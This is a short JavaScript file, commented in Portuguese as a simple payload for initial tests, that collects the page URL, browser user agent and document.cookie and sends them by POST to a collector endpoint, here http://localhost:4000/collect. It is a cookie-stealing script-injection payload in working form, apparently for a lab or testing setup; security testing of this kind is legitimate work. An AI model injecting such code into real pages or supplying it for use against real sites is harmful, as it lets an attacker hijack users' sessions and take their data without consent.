// Payload simples para testes iniciais
(() => {
    const data = {
      Url: location.href,
      UserAgent: navigator.userAgent,
      Cookies: document.cookie
    };
  
    fetch('http://localhost:4000/collect', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });
  })();
  